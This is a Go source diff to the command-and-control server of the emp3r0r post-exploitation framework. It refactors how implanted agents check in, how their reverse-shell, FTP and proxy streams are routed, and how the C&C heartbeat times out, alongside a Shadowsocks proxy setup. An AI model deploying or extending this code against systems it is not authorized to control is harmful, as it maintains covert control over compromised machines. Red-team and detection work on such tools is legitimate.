@@ -4,7 +4,6 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"strconv"
@@ -28,8 +27,18 @@ import (
 // You can use the offical Shadowsocks program to start
 // the same Shadowsocks server on any host that you find convenient
 func ShadowsocksServer() {
-	err := ss.SSMain("0.0.0.0:"+RuntimeConfig.ShadowsocksPort, "", ss.AEADCipher,
-		RuntimeConfig.ShadowsocksPassword, true, false)
+	ctx, cancel := context.WithCancel(context.Background())
+	var ss_config = &ss.SSConfig{
+		ServerAddr:     "0.0.0.0:" + RuntimeConfig.ShadowsocksPort,
+		LocalSocksAddr: "",
+		Cipher:         ss.AEADCipher,
+		Password:       RuntimeConfig.ShadowsocksPassword,
+		IsServer:       true,
+		Verbose:        false,
+		Ctx:            ctx,
+		Cancel:         cancel,
+	}
+	err := ss.SSMain(ss_config)
 	if err != nil {
 		CliFatalError("ShadowsocksServer: %v", err)
 	}
@@ -61,6 +70,39 @@ func TLSServer() {
 	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", RuntimeConfig.CCPort), EmpWorkSpace+"/emp3r0r-cert.pem", EmpWorkSpace+"/emp3r0r-key.pem", nil)
 	if err != nil {
 		CliFatalError("Failed to start HTTPS server at *:%s", RuntimeConfig.CCPort)
+	}
+}
+
+func dispatcher(wrt http.ResponseWriter, req *http.Request) {
+	vars := mux.Vars(req)
+
+	var rshellConn, proxyConn emp3r0r_data.H2Conn
+	RShellStream.H2x = &rshellConn
+	ProxyStream.H2x = &proxyConn
+
+	token := vars["token"]
+	api := tun.WebRoot + "/" + vars["api"]
+	switch api {
+	// Message-based communication
+	case tun.CheckInAPI:
+		checkinHandler(wrt, req)
+	case tun.MsgAPI:
+		msgTunHandler(wrt, req)
+
+	// stream based
+	case tun.FTPAPI:
+		// find handler with token
+		for _, sh := range FTPStreams {
+			if token == sh.Token {
+				sh.ftpHandler(wrt, req)
+				return
+			}
+		}
+		wrt.WriteHeader(http.StatusForbidden)
+	case tun.ProxyAPI:
+		ProxyStream.portFwdHandler(wrt, req)
+	default:
+		wrt.WriteHeader(http.StatusBadRequest)
 	}
 }
 
@@ -363,52 +405,30 @@ func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Reque
 	}
 }
 
-func dispatcher(wrt http.ResponseWriter, req *http.Request) {
-	vars := mux.Vars(req)
-
-	var rshellConn, proxyConn emp3r0r_data.H2Conn
-	RShellStream.H2x = &rshellConn
-	ProxyStream.H2x = &proxyConn
-
-	token := vars["token"]
-	api := tun.WebRoot + "/" + vars["api"]
-	switch api {
-	// Message-based communication
-	case tun.CheckInAPI:
-		checkinHandler(wrt, req)
-	case tun.MsgAPI:
-		msgTunHandler(wrt, req)
-
-	// stream based
-	case tun.FTPAPI:
-		// find handler with token
-		for _, sh := range FTPStreams {
-			if token == sh.Token {
-				sh.ftpHandler(wrt, req)
-				return
-			}
-		}
-		wrt.WriteHeader(http.StatusForbidden)
-	case tun.ProxyAPI:
-		ProxyStream.portFwdHandler(wrt, req)
-	default:
-		wrt.WriteHeader(http.StatusBadRequest)
-	}
-}
-
 // receive checkin requests from agents, add them to `Targets`
 func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
-	var target emp3r0r_data.SystemInfo
-	jsonData, err := ioutil.ReadAll(req.Body)
-	defer req.Body.Close()
+	// use h2conn
+	conn, err := h2conn.Accept(wrt, req)
+	defer func() {
+		err = conn.Close()
+		if err != nil {
+			CliPrintWarning("checkinHandler close connection: %v", err)
+		}
+		CliPrintDebug("checkinHandler finished")
+	}()
 	if err != nil {
-		CliPrintError("checkinHandler: " + err.Error())
+		CliPrintError("checkinHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
+		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
 		return
 	}
+	var (
+		target emp3r0r_data.AgentSystemInfo
+		in     = json.NewDecoder(conn)
+	)
 
-	err = json.Unmarshal(jsonData, &target)
+	err = in.Decode(&target)
 	if err != nil {
-		CliPrintError("checkinHandler: " + err.Error())
+		CliPrintWarning("checkinHandler decode: %v", err)
 		return
 	}
 
@@ -428,7 +448,7 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 		}
 		CliMsg("Checked in: %s from %s, "+
 			"running %s\n",
-			shortname, fmt.Sprintf("%s - %s", target.From, target.Transport),
+			strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport),
 			strconv.Quote(target.OS))
 
 		ListTargets() // refresh agent list
@@ -455,8 +475,11 @@ func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
 	}
 }
 
-// msgTunHandler JSON message based tunnel between agent and cc
+// msgTunHandler JSON message based (C&C) tunnel between agent and cc
 func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
+	// updated on each successful handshake
+	var last_handshake = time.Now()
+
 	// use h2conn
 	conn, err := h2conn.Accept(wrt, req)
 	if err != nil {
@@ -465,7 +488,10 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 		return
 	}
 
+	ctx, cancel := context.WithCancel(context.Background())
+
 	defer func() {
+		CliPrintDebug("msgTunHandler exiting")
 		for t, c := range Targets {
 			if c.Conn == conn {
 				delete(Targets, t)
@@ -477,10 +503,11 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 				break
 			}
 		}
-		err = conn.Close()
-		if err != nil {
-			CliPrintError("msgTunHandler failed to close connection: " + err.Error())
+		if conn != nil {
+			conn.Close()
 		}
+		cancel()
+		CliPrintDebug("msgTunHandler exited")
 	}()
 
 	// talk in json
@@ -492,38 +519,67 @@ func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
 
 	// Loop forever until the client hangs the connection, in which there will be an error
 	// in the decode or encode stages.
-	for {
-		// deal with json data from agent
-		err = in.Decode(&msg)
-		if err != nil {
-			return
-		}
-		// read hello from agent, set its Conn if needed, and hello back
-		// close connection if agent is not responsive
-		if strings.HasPrefix(msg.Payload, "hello") {
-			reply_msg := msg
-			reply_msg.Payload = "hello" + util.RandStr(util.RandInt(10, 100))
-			err = out.Encode(reply_msg)
+	go func() {
+		defer cancel()
+		for ctx.Err() == nil {
+			// deal with json data from agent
+			err = in.Decode(&msg)
 			if err != nil {
-				CliPrintWarning("msgTunHandler cannot send hello to agent %s", msg.Tag)
 				return
 			}
+			// read hello from agent, set its Conn if needed, and hello back
+			// close connection if agent is not responsive
+			if strings.HasPrefix(msg.Payload, "hello") {
+				reply_msg := msg
+				reply_msg.Payload = msg.Payload + util.RandStr(util.RandInt(1, 10))
+				err = out.Encode(reply_msg)
+				if err != nil {
+					CliPrintWarning("msgTunHandler cannot answer hello to agent %s", msg.Tag)
+					return
+				}
+				last_handshake = time.Now()
+			}
+
+			// process json tundata from agent
+			processAgentData(&msg)
+
+			// assign this Conn to a known agent
+			agent := GetTargetFromTag(msg.Tag)
+			if agent == nil {
+				CliPrintError("%v: no agent found by this msg", msg)
+				return
+			}
+			shortname := agent.Name
+			if agent == nil {
+				CliPrintWarning("msgTunHandler: agent not recognized")
+				return
+			}
+			if Targets[agent].Conn == nil {
+				CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
+				CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
+			}
+			Targets[agent].Conn = conn
+			Targets[agent].Ctx = ctx
+			Targets[agent].Cancel = cancel
 		}
+	}()
 
-		// process json tundata from agent
-		processAgentData(&msg)
-
-		// assign this Conn to a known agent
-		agent := GetTargetFromTag(msg.Tag)
-		shortname := strings.Split(agent.Tag, "-agent")[0]
-		if agent == nil {
-			CliPrintWarning("msgTunHandler: agent not recognized")
+	// wait no more than 2 min,
+	// if agent is unresponsive, kill connection and declare agent death
+	for ctx.Err() == nil {
+		since_last_handshake := time.Since(last_handshake)
+		agent_by_conn := GetTargetFromH2Conn(conn)
+		name := emp3r0r_data.Unknown
+		if agent_by_conn != nil {
+			name = agent_by_conn.Name
+		}
+		CliPrintDebug("Last handshake from agent '%s': %v ago", name, since_last_handshake)
+		if since_last_handshake > 2*time.Minute {
+			CliPrintDebug("msgTunHandler: timeout, "+
+				"hanging up agent (%v)'s C&C connection",
+				name)
 			return
 		}
-		if Targets[agent].Conn == nil {
-			CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
-			CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
-		}
-		Targets[agent].Conn = conn
+		util.TakeABlink()
 	}
 }
